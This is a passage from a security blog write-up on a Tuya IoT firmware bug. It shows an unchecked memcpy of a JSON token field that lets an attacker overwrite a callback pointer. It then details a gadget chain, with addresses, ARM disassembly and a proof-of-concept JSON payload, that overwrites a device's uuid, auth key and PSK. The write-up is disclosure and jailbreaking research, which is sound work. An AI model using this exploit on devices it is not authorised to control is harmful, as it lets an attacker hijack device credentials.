<!doctype html><html lang=en data-mode=dark><head prefix="og: http://ogp.me/ns#"><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.101.0"><meta name=theme content="Color Your World -- gitlab.com/rmaguiar/hugo-theme-color-your-world"><title>Light jailbreaking: exploiting Tuya IoT devices for fun and profit | rb9</title><meta name=author content="kmhn"><meta name=description content="Identification and exploitation of a vulnerability affecting Tuya IoT devices, going from a device configuration request to remote code execution."><meta name=robots content="index follow"><meta name=referrer content="no-referrer-when-downgrade"><link rel=canonical href=https://rb9.nl/posts/2022-03-29-light-jailbreaking-exploiting-tuya-iot-devices/><link rel=icon type=image/png href=/favicon.png><link rel=stylesheet type=text/css href=https://rb9.nl/css/main-change.css><script src=/js/jquery-3.5.2.min.js integrity=sha384-1bBkQsBsW57bhUxHyzsKVpryuEaU5QMhTAMnrtXtwU0bfGso+sR3Us0iRBVE+BVo></script>
<script data-goatcounter=https://rb9.goatcounter.com/count async src=//gc.zgo.at/count.js></script><meta property="og:site_name" content="rb9"><meta property="og:title" content="Light jailbreaking: exploiting Tuya IoT devices for fun and profit"><meta property="og:description" content="Identification and exploitation of a vulnerability affecting Tuya IoT devices, going from a device configuration request to remote code execution."><meta property="og:url" content="https://rb9.nl/posts/2022-03-29-light-jailbreaking-exploiting-tuya-iot-devices/"><meta property="og:image" content="https://rb9.nl/cover_hu34ef8a6c2ad2188b0efd6a4dc392a36b_24932_1200x630_fill_box_smart1_3.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="630"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://rb9.nl/cover_hu34ef8a6c2ad2188b0efd6a4dc392a36b_24932_1280x640_fill_box_smart1_3.png"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-03-29"><meta property="article:modified_time" content="2022-07-16"><meta property="og:updated_time" content="2022-07-16"><meta property="article:author" content="kmhn"><meta name=twitter:creator content="@notkmhn"><meta name=twitter:site content="@notkmhn"><meta name=twitter:dnt content="on"><meta name=theme-color content="#222"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="default"><script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebSite","@id":"https:\/\/rb9.nl\/"},"headline":"Light jailbreaking: exploiting Tuya IoT devices for fun and profit","description":"Identification and exploitation of a vulnerability affecting Tuya IoT devices, going from a device configuration request to remote code execution.","image":["https://rb9.nl/cover_hu34ef8a6c2ad2188b0efd6a4dc392a36b_24932_1280x640_fill_box_smart1_3.png","https://rb9.nl/cover_hu34ef8a6c2ad2188b0efd6a4dc392a36b_24932_1200x630_fill_box_smart1_3.png","https://rb9.nl/cover_hu34ef8a6c2ad2188b0efd6a4dc392a36b_24932_1280x0_resize_box_3.png"],"url":"https:\/\/rb9.nl\/posts\/2022-03-29-light-jailbreaking-exploiting-tuya-iot-devices\/","inLanguage":"en","datePublished":"2022-03-29","dateModified":"2022-07-16","wordCount":"2629","publisher":{"@type":"Person","name":"kmhn"},"author":{"@type":"Person","name":"kmhn","description":"Enjoys computer science, mathematics and information security.","sameAs":["https://github.com/notkmhn","https://keybase.io/kmhn","https://twitter.com/notkmhn"]}}</script><link rel=stylesheet href=/css/main.min.css><noscript><meta name=theme-color content="#f27466"><style>html{--accent:#f27466}.req-js{display:none}</style></noscript><link rel=preload href=/fonts/open-sans-v17-latin-700.woff as=font crossorigin=anonymous><link rel=preload href=/fonts/open-sans-v17-latin-700.woff2 as=font crossorigin=anonymous><link rel=preload href=/fonts/open-sans-v17-latin-italic.woff as=font crossorigin=anonymous><link rel=preload href=/fonts/open-sans-v17-latin-italic.woff2 as=font crossorigin=anonymous><link rel=preload href=/fonts/open-sans-v17-latin-regular.woff as=font crossorigin=anonymous><link rel=preload href=/fonts/open-sans-v17-latin-regular.woff2 as=font crossorigin=anonymous><link rel=preload href=/fonts/oswald-v29-latin-700.woff as=font crossorigin=anonymous><link rel=preload href=/fonts/oswald-v29-latin-700.woff2 as=font crossorigin=anonymous><link rel=me href=https://github.com/notkmhn><link rel=me href=https://keybase.io/kmhn><link rel=me href=https://twitter.com/notkmhn><script>"use strict";const ROOT=document.documentElement,SHEET=document.documentElement.style,META_THEME_COLOR=document.querySelector("meta[name=theme-color]");function setDark(){ROOT.dataset.mode="dark"}function setLight(){ROOT.dataset.mode="light"}localStorage.getItem("isDark")=="true"?setDark():localStorage.getItem("isDark")=="false"&&setLight();function getAccent(){if(ROOT.dataset.mode==="dark")if(localStorage.getItem("darkAccent")===null)var e="#f27466";else e=localStorage.getItem("darkAccent");else ROOT.dataset.mode==="light"&&(localStorage.getItem("lightAccent")===null?(e="#225670"):(e=localStorage.getItem("lightAccent")));return e}var activeAccent=getAccent();SHEET.setProperty("--accent",activeAccent),META_THEME_COLOR.setAttribute("content",activeAccent);function updateAccent(){var e=getAccent();SHEET.setProperty("--accent",e),PALETTE.value=e,META_THEME_COLOR.setAttribute("content",e)}document.addEventListener("DOMContentLoaded",function(){PALETTE.value=activeAccent;function e(){document.body.style.transition=document.querySelector("header").style.transition=document.querySelector("footer").style.transition="background-color .3s ease, color .3s ease"}function t(){e(),ROOT.dataset.mode=="light"?(setDark(),localStorage.setItem("isDark","true")):(setLight(),localStorage.setItem("isDark","false")),updateAccent()}document.querySelector("footer button").addEventListener("click",t)})</script></head><body><header><a href=/>rb9</a><nav aria-label="Main menu."><ul><li><a class=btn href=/posts/>Posts</a></li><li><a class=btn href=/posts/index.xml>RSS</a></li></ul></nav></header><div class=filler><main><article><header><h1>Light jailbreaking: exploiting Tuya IoT devices for fun and profit</h1><section class=terms><ul><li><a class=btn href=/tags/hacking/>hacking</a></li><li><a class=btn href=/tags/hardware/>hardware</a></li><li><a class=btn href=/tags/iot/>iot</a></li></ul></section><p>Published on <time datetime=2022-03-29>2022-03-29</time>. Last updated on <time datetime=2022-07-16>2022-07-16</time></p></header><p>Tuya Smart is one of the biggest global manufacturers of affordable whitelabel IoT devices for various brands. Wanting to use their WiFi-connected LED lights locally without connecting to the cloud, I went on a hunt together with <a href=https://twitter.com/Tom_Clement>Tom Clement</a> to run custom firmware on these lights.</p><p>In this writeup, we describe the out-of-bounds memory write bug we found, along with an exploit chain that allows overwriting all security keys needed to control most Tuya devices and flash custom firmware over-the-air given physical access to the device.</p><p>We started coordinated disclosure with Tuya on Feb 12th 2022 to report the bug we used, which has since been patched on newly-produced stock. They were friendly and very cooperative, and we want to thank them for our pleasant experience.</p><p><strong>N.B.</strong> jailbreak/exploit tooling can be found <a href=https://github.com/tuya-cloudcutter/tuya-cloudcutter>on the tuya-cloudcutter GitHub repository</a>.</p><h2 id=summary><a class=anchor href=#summary title='Anchor for "Summary".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a>Summary</h2><p>We identified a vulnerability in the AP configuration process in the <a href=https://github.com/tuya/tuya-iotos-embeded-sdk-wifi-ble-bk7231t>BK7231T</a> and <a href=https://github.com/tuya/tuya-iotos-embeded-sdk-wifi-ble-bk7231n>BK7231N</a> SDKs. This vulnerability seems to have existed in these SDKs since their debut on GitHub. It also existed in more or less the same form on all of the devices&rsquo; firmware that we have dissected. The vulnerability allows hijacking control flow on the device; but in a rather limited fashion. However, when coupled with a few <em>interesting</em> subroutines that we found in the SDKs (as well as deployed firmware), we managed to build an exploit chain leading to control over factory-burned secrets on the device. More specifically, the exploit chain allows overwriting these device parameters with controlled data:</p><ul><li>UUID: the device unique identifier.</li><li>Authentication key, AKA <code>authkey</code> or <code>auzkey</code>: this parameter along with the UUID uniquely identify a device and allow it to further encrypt and authenticate its TLS-wrapped communication with Tuya&rsquo;s servers.</li><li>Pre-Shared Key, AKA <code>psk</code> or <code>pskkey</code>: used as a shared secret to establish a TLS communication channel between the device and Tuya&rsquo;s servers.</li></ul><p>Armed with these parameters, it is possible to locally configure (i.e. set the local and sec keys used for local device control) and control the stock firmware without the need to communicate with Tuya&rsquo;s servers in addition to remotely initiating Over-The-Air (OTA) firmware updates.</p><p><strong>N.B.</strong> this vulnerability is practically unexploitable for attackers without physical access to the affected device, because the vulnerable code path requires that the device is set in configuration mode which requires physical access. Therefore, we would like to make it clear that there&rsquo;s likely little to no impact for the average user. However, it is interesting from a &ldquo;jailbreaking&rdquo; point of view for the more advanced users who would want to exercise more control over the software on their smart home devices.</p><p>The rest of this writeup elaborates on the details of the vulnerability as well as the exploit chain. Enjoy ;)</p><h2 id=vulnerability-description><a class=anchor href=#vulnerability-description title='Anchor for "Vulnerability description".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a>Vulnerability description</h2><p>To start off, let&rsquo;s get a bit of a background to get the context set up. Most of the Tuya devices we&rsquo;ve tested have a so-called &lsquo;AP configuration mode.&rsquo; In this mode, which is usually reachable by turning the device off then on a few times, the device would set up and advertise a WiFi AP. From there, the user can configure the device to connect to the user&rsquo;s own network by connecting to its AP and using any of the &ldquo;Smart Life&rdquo; style applications.</p><p>Taking a bit of a deeper look, the following recipe is more or less what happens:</p><ol><li>Device sets up a WiFi AP with DHCP and hands out leases for <code>192.168.175.0/24</code>. It assigns itself the IP address <code>192.168.175.1</code>.</li><li>It listens on port <code>6669</code> over UDP for configuration messages. These messages are sent by Smart Life apps to onboard the device on the user&rsquo;s WiFi AP.</li><li>The user is asked to enter their AP SSID and optionally a password, after which their smartphone spams the the configuration message over the network to the UDP service listening on the device on port <code>6669</code>. <strong>One important point to note here is that the entire UDP message payload (that is the message contents, not including the UDP headers) cannot exceed 256 bytes.</strong></li><li>Once one of these configuration messages make it to the device, it will parse the message and if sane, shut down its AP and reconfigure itself as a station. It will then attempt to connect to the user&rsquo;s designated AP and immediately starts a cloud-based configuration request-response sequence with Tuya&rsquo;s servers.</li></ol><p>There are more steps than that until the device is considered &lsquo;functionally configured.&rsquo; However, for the purposes of this write-up we will keep ourselves to just the steps above.</p><p>Onto the implementation of the process outlined above; the messages are encapsulated in a binary format which is essentially some TLV (Type-Length-Value) format with CRC to check for validity. We won&rsquo;t look at the encapsulation since it&rsquo;s not terribly important; what&rsquo;s important to note is the payload which is the configuration message. It&rsquo;s a JSON-formatted payload which is optionally encrypted, and has the following structure:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;ssid&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;SSID&gt;&#34;</span><span class=p>,</span> <span class=nt>&#34;passwd&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;PASSWORD&gt;&#34;</span><span class=p>,</span> <span class=nt>&#34;token&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;TOKEN&gt;&#34;</span><span class=p>}</span>
</span></span></code></pre></div><p><code>ssid</code> and <code>passwd</code> are self-explanatory. As for the <code>token</code>, it&rsquo;s usually an 8-character ASCII string which is generated by Tuya&rsquo;s servers as a result of a so-called &lsquo;registration request&rsquo; that the apps invoke. This code is a short-lived one-time use token which the device has to get right in order to be &lsquo;activated&rsquo; on the server side.</p><p>Keeping this structure in mind, let&rsquo;s move onto the implementation on the device&rsquo;s side of the equation. In the <a href=https://github.com/khalednassar/tuya-iotos-embeded-sdk-wifi-ble-bk7231t/blob/dd9c585dc2b69897c69919c4b6dde7fe7a71dc1a/sdk/lib/libtuya_iot.a><code>libtuya_iot.a</code> binary blob which is part of the BK7231T SDK</a>, there is an object file named <code>ap_netcfg.c.o</code>. This file, as the name indicates, contains the code which implements a sizeable part of the AP configuration process; the most interesting bits of which can be found in the <code>__udp_ap_v3</code> function.</p><p>Zooming into it, the annotated pseudocode for the process is as follows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// 1. Receive UDP message from socket and parse the binary container
</span></span></span><span class=line><span class=cl><span class=c1>// 2. Look for the wrapped JSON payload
</span></span></span><span class=line><span class=cl><span class=c1>// 3. Parse the JSON payload
</span></span></span><span class=line><span class=cl><span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1>// 4. Processing:
</span></span></span><span class=line><span class=cl><span class=c1>// lan_ap_nw_cfg is a pointer to a global struct containing info
</span></span></span><span class=line><span class=cl><span class=c1>// about the AP network configuration
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>ap_cfg_token_data</span> <span class=o>=</span> <span class=n>lan_ap_nw_cfg</span><span class=o>-&gt;</span><span class=n>ap_cfg_token</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>// ap_cfg_token_data is where the token from the JSON payload gets copied
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>memset</span><span class=p>(</span><span class=n>ap_cfg_token_data</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x40</span><span class=p>);</span> <span class=c1>// Zero out the field
</span></span></span><span class=line><span class=cl><span class=c1>// token_string is the string representation of the
</span></span></span><span class=line><span class=cl><span class=c1>// token object in the blob
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>token_string_len</span> <span class=o>=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>token_string</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>memcpy</span><span class=p>(</span><span class=n>ap_cfg_token_data</span><span class=p>,</span><span class=n>token_string</span><span class=p>,</span><span class=n>token_string_len</span><span class=p>);</span> <span class=c1>// [1]
</span></span></span><span class=line><span class=cl><span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1>// 5. Once the data has been parsed, signal the received AP config
</span></span></span><span class=line><span class=cl><span class=c1>// parameters by invoking the finish_cb function pointer, which is
</span></span></span><span class=line><span class=cl><span class=c1>// configured during device initialization.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>pcVar2</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=o>*</span><span class=n>lan_ap_network_config_struct</span><span class=o>-&gt;</span><span class=n>finish_cb</span><span class=p>)((</span><span class=n>PTR_SSID_PASSWORD_TOKEN</span><span class=p>)</span><span class=o>&amp;</span><span class=n>lan_ap_network_config_struct</span><span class=o>-&gt;</span><span class=n>spt</span><span class=p>,</span><span class=mh>0x10002</span><span class=p>);</span> <span class=c1>// [2]
</span></span></span><span class=line><span class=cl><span class=c1>// 6. Process the results of the finish_cb invocation and loop back to
</span></span></span><span class=line><span class=cl><span class=c1>// the beginning if invalid. Otherwise, terminate this process and its
</span></span></span><span class=line><span class=cl><span class=c1>// associated FreeRTOS task.
</span></span></span></code></pre></div><p>And the structure of the <code>lan_ap_nw_cfg</code> struct, as found in <code>ap_netcfg.c.o</code> is:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>SSID_PASSWORD_TOKEN</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span> <span class=n>ssid</span><span class=p>[</span><span class=mi>33</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span> <span class=n>s_len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span> <span class=n>passwd</span><span class=p>[</span><span class=mi>65</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span> <span class=n>p_len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span> <span class=n>token</span><span class=p>[</span><span class=mi>17</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span> <span class=n>t_len</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>LAN_AP_NW_CFG_S</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>THRD_HANDLE</span> <span class=kr>thread</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>BYTE_T</span> <span class=n>recv_buf</span><span class=p>[</span><span class=mi>256</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>CHAR_T</span> <span class=n>ap_cfg_token</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>INT_T</span> <span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>TIMER_ID</span> <span class=n>log_ack_timer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>MSG_ID</span> <span class=n>send_log_mid</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span> <span class=n>finish_cb</span><span class=p>)(</span><span class=n>PTR_SSID_PASSWORD_TOKEN</span><span class=p>,</span> <span class=kt>int</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>SSID_PASSWORD_TOKEN</span> <span class=n>spt</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>undefined</span> <span class=n>field_0x1c6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>undefined</span> <span class=n>field_0x1c7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>UINT_T</span> <span class=n>log_len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>CHAR_T</span> <span class=o>*</span> <span class=n>log_buf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>UNW_IP_ADDR_T</span> <span class=n>client_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>UCHAR_T</span> <span class=n>ap_cfg_finished</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>UCHAR_T</span> <span class=n>err_log_finished</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>UCHAR_T</span> <span class=n>log_serial_finished</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>UCHAR_T</span> <span class=n>has_log_serial</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>UCHAR_T</span> <span class=n>ap_disconnected</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>undefined</span> <span class=n>field_0x1d9</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>undefined</span> <span class=n>field_0x1da</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>undefined</span> <span class=n>field_0x1db</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>netcfg_type</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p>The little code section above highlights the vulnerability in its purest form; the <code>token</code> field in the JSON structure has no length restriction and is used (along with its length calculated by <code>strlen</code>) as an argument to <code>memcpy</code> at <code>[1]</code>, which immediately allows us to pull off an out-of-bounds (OOB) write to the <code>ap_cfg_token</code> field. By using this OOB write, we can clobber all the subsequent fields in <code>lan_ap_nw_cfg</code> all the way to the <code>finish_cb</code> field which gets used at <code>[2]</code>, meaning that control flow redirection is possible.</p><h2 id=exploitation><a class=anchor href=#exploitation title='Anchor for "Exploitation".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a>Exploitation</h2><p>The vulnerability provides us with a great primitive to be working from. However, when it comes to <em>useful</em> exploitation, there are some caveats that we have to be aware of:</p><ol><li>As mentioned before, the message length cannot exceed 256 bytes. Since the wrapping binary format is necessary, that also puts a size limit on the JSON payload length which can not exceed 232 bytes.</li><li>There can be no null bytes in the <code>token</code> field; that is because the library used to parse JSON, which is a modified version of <a href=https://github.com/DaveGamble/cJSON>cJSON</a> called &rsquo;ty_cJSON&rsquo;, also uses C-style null-terminated strings. Additionally, should it have not been a problem for the parser, it would have still not worked because number of bytes copied is decided by a <code>strlen</code> invocation. Luckily, the BK7231 chips are little-endian ARM processors; making this more of a minor inconvenience than an issue.</li><li>As far as we&rsquo;re aware, it isn&rsquo;t possible to execute code directly from flash, stack nor heap memory regions on BK7231 processors. This may turn out to be incorrect due to the general lack of information about the platform. Of course, there are ways around this limitation (e.g. ROP/JOP/COP), but it makes generalized exploitation harder to pull off and we haven&rsquo;t been able to build a firmware version agnostic chain yet.</li></ol><p>With these limitations in mind, we can start building an exploit chain by analyzing the stack and registers&rsquo; content around the invocation site of <code>finish_cb</code>. Additionally, we have to find some ROP/COP gadgets which could allow us to build control flow redirection chains given that we initially have no control over the stack&rsquo;s contents at the invocation site, but some control over whatever data that gets parsed from the received UDP message.</p><p>After a bit of reversing and some trial-and-error runs on an E27 smart light device, we mapped out the registers&rsquo; contents at the invocation site:</p><pre tabindex=0><code>r0 = pointer to ssid
r1 = 0x10002
r2 = 0x80000000
r3 = finish_cb function pointer
r4 = (pointer to lan_ap_nw_cfg + 0xfc) ; [1]
r5 = pointer to passwd
r6 = pointer to ssid
r7 = pointer to the parsed ty_cJSON object associated with the configuration request
</code></pre><p><strong>[1]</strong> - this is about 8 bytes away from the end of the UDP receive buffer used by the task, so we have some control over that as well and it nicely has no constraints on the value of the bytes that can be there.</p><p>We also found a rather handy instruction pattern littered all over the firmware which allows building COP chains that enact side-effects on register values:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-armasm data-lang=armasm><span class=line><span class=cl>ldr <span class=err>rX</span>, <span class=err>[rY</span>, #<span class=err>Z]</span>
</span></span><span class=line><span class=cl>adds <span class=err>rD</span>, <span class=err>rS</span>, #<span class=mi>0</span>
</span></span><span class=line><span class=cl>blx <span class=err>rX</span>
</span></span></code></pre></div><p>where <code>rX</code> was found to be usually <code>r3</code>.</p><p>Using these two pieces of information, it&rsquo;s possible to build ROP chains which are somewhat useful. For example, to perform the operation <code>r0 = r7</code> then pass control to a specific code section, we could search for gadgets that implement <code>adds r0, r7, #0</code> as the middle instruction. By choosing <code>rY, #Z</code> to be some displacement from a register such as <code>r0</code> or <code>r5</code> which point to the controlled <code>ssid</code> and <code>passwd</code> respectively, it is also possible to choose where to pass control flow next. On the same E27 device, one such gadget which is semantically equivalent but of a different form and consisting of THUMB instructions is</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-armasm data-lang=armasm><span class=line><span class=cl>adds <span class=nc>r0</span>, <span class=nc>r7</span>, #<span class=mi>0</span>
</span></span><span class=line><span class=cl>ldr <span class=nc>r1</span>, <span class=err>[sp</span>, #<span class=mi>8</span><span class=err>]</span>
</span></span><span class=line><span class=cl>ldr <span class=nc>r3</span>, <span class=err>[</span><span class=nc>r5</span>, #<span class=mh>0x20</span><span class=err>]</span>
</span></span><span class=line><span class=cl>blx <span class=nc>r3</span>
</span></span></code></pre></div><p>In order to utilize that, we modify the <code>finish_cb</code> pointer to that gadget&rsquo;s address (<code>0x000b94b8</code>) by setting the <code>token</code> field to 72 bytes of padding followed by <code>\xb9\x94\x0b</code>. Additionally, we also set the <code>passwd</code> field to 32 bytes of padding followed by the address of the next instruction that we would like to continue execution at after setting <code>r0 = r7</code>. Of course, other side effects are possible and the firmware is large enough to have a bit of a variety within executable regions, at least for most register value copies.</p><h3 id=from-control-flow-redirection-to-remote-ota-updates><a class=anchor href=#from-control-flow-redirection-to-remote-ota-updates title='Anchor for "From control flow redirection to remote OTA updates".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a>From control flow redirection to remote OTA updates</h3><p>So it&rsquo;s possible to redirect control flow, and there are ways to pull off some useful side effects. Nonetheless, so far this is a far cry from remote OTA updates. Is that possible within these constraints?</p><p>Turns out that it is! We noticed that there&rsquo;s a piece of test code for post-production testing, in the function named <code>__mf_cmd_process</code> for the BK7231T SDK or <code>mf_basic_test</code> for the BK7231N SDK. Both function versions seem to be used for multiple factory configuration routines, including perhaps changing necessary flash-persisted parameters through serial. Both of these functions can usually be found in some code object which has the name <code>mf_test.c.o</code> or <code>basic_test.c.o</code>.</p><p>In pseudocode, the functionality of that piece of code is something similar to the following procedure set:</p><pre tabindex=0><code>1. Read data from serial
2. Perform some checks on it
...
3. If all the checks pass, then

c = parsed ty_JSON object retrieved from serial
// [1]
gateway_base_conf = malloc(sizeof(GW_BASE_S))

// The following parameters are checked for presence in the object
// and subsequently used. All of them are necessary for the function
// to successfully complete. Otherwise, early bail-out occurs.
gateway_base_conf.auth_key = c[&#34;auzkey&#34;] // string, must not be empty
gateway_base_conf.psk_key = c[&#34;pskKey&#34;] // string, can be empty string
gateway_base_conf.uuid = c[&#34;uuid&#34;] // string, must not be empty
gateway_base_conf.ap_ssid = c[&#34;ap_ssid&#34;] // string, should not be empty
gateway_base_conf.prod_test = c[&#34;prod_test&#34;] // boolean: must be false

persist_to_encrypted_flash(gateway_base_conf)

4. Print some debug info and return to caller
</code></pre><p>This function provides all the necessary ingredients to overwrite the device secret parameters: <code>uuid</code>, <code>auzkey</code> and <code>pskKey</code> with ones that we control. Before we can use it, though, we must have a JSON payload which has all the necessary parameters. Doing so correctly is a bit tricky due to the size limitation in our payload and the limited number of usable gadget side effects. It won&rsquo;t be possible to try and smuggle another JSON payload within any of the fields of the configuration message.</p><p>However, we can simply fill the configuration message JSON payload with the necessary fields without any side effects on the vulnerability trigger. All we would have to do then is find an intermediate gadget which sets the return value register, namely <code>r0</code>, to the register holding the parsed <code>ty_cJSON</code> object which represents the configuration message. Thereby, once we trigger the vulnerability, it sets <code>c</code> at <code>[1]</code> above to our configuration message and continues execution all the way to persisting our chosen parameters in flash. Looking at the disassembly of the function on the test E27 device firmware, the exact target location <code>[1]</code> can be clearly identified at address <code>0x000ad514</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-armasm data-lang=armasm><span class=line><span class=cl><span class=c1>; ...
</span></span></span><span class=line><span class=cl><span class=c1></span>ldr        <span class=nc>r3</span>,<span class=err>[sp</span>,#<span class=mh>0x38</span><span class=err>]</span> <span class=c1>; 0x000ad508
</span></span></span><span class=line><span class=cl><span class=c1></span>add        <span class=nc>r3</span>,#<span class=mh>0x6</span> <span class=c1>; 0x000ad50a
</span></span></span><span class=line><span class=cl><span class=c1></span>add        <span class=nc>r1</span>,<span class=err>3</span>,#<span class=mh>0x0</span> <span class=c1>; 0x000ad50c
</span></span></span><span class=line><span class=cl><span class=c1></span>str        <span class=nc>r3</span>,<span class=err>[sp</span>,#<span class=mh>0x3c</span><span class=err>]</span> <span class=c1>; 0x000ad50e
</span></span></span><span class=line><span class=cl><span class=c1></span>bl         <span class=err>ty_cJSON_Parse</span> <span class=c1>; 0x000ad510
</span></span></span><span class=line><span class=cl><span class=c1></span>ldr        <span class=nc>r7</span>,<span class=err>[LAB_000a</span><span class=nc>d79</span><span class=err>c]</span> <span class=c1>; 0x000ad514 - [1]
</span></span></span><span class=line><span class=cl><span class=c1></span>sub        <span class=nc>r6</span>,<span class=nc>r0</span>,#<span class=mh>0x0</span> <span class=c1>; 0x000ad516
</span></span></span><span class=line><span class=cl><span class=c1></span>bne        <span class=err>LAB_000a</span><span class=nc>d52</span><span class=err>c</span> <span class=c1>; 0x000ad518
</span></span></span><span class=line><span class=cl><span class=c1>; ...
</span></span></span></code></pre></div><h3 id=putting-it-all-together><a class=anchor href=#putting-it-all-together title='Anchor for "Putting it all together".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a>Putting it all together</h3><p>To wrap up, using the E27 smart device we&rsquo;ve mentioned as an example so far:</p><p>Set the device in AP configuration mode and connect to the AP. Afterwards, send a configuration message to the configuration service listening on UDP port 6669 which includes the following JSON payload structure:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;auzkey&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;desired auth key&gt;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;uuid&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;desired uuid&gt;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;pskKey&#34;</span><span class=p>:</span><span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;prod_test&#34;</span><span class=p>:</span><span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;ap_ssid&#34;</span><span class=p>:</span><span class=s2>&#34;A&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;ssid&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;ssid value&gt;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;token&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;72 bytes of padding&gt;&lt;least significant 3 bytes of intermediate gadget&gt;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;passwd&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;passwd value&gt;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>And for that specific E27 light bulb, this is the final payload which we used as a Proof-of-Concept:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;auzkey&#34;</span><span class=p>:</span><span class=s2>&#34;AAAAAAAAAAAAAAAA&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;uuid&#34;</span><span class=p>:</span><span class=s2>&#34;abcd&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;pskKey&#34;</span><span class=p>:</span><span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;prod_test&#34;</span><span class=p>:</span><span class=kc>false</span><span class=p>,</span>
